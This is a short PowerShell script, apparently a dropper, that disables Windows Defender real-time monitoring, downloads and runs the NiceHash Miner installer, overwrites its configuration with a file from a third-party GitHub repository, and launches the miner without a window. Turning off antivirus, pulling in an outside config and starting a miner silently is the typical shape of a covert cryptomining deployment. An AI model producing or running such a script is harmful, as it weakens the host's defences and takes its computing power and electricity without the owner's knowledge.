Set-MpPreference -DisableRealtimeMonitoring $true
Invoke-WebRequest -Uri "https://github.com/nicehash/NiceHashMiner/releases/download/3.1.0.9/nhm_windows_3.1.0.9.exe" -OutFile "$env:TEMP\nhm_windows_3.1.0.9.exe"
Start-Process -FilePath "$env:TEMP\nhm_windows_3.1.0.9.exe" -Wait
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CoC-Fire/nicehash-configs-stuff/main/configs/General.json" -OutFile "$env:APPDATA\Local\Programs\NiceHash Miner\configs\General.json" -Force
Start-Process -FilePath "$env:APPDATA\Local\Programs\NiceHash Miner\NiceHashMiner.exe" -NoNewWindow
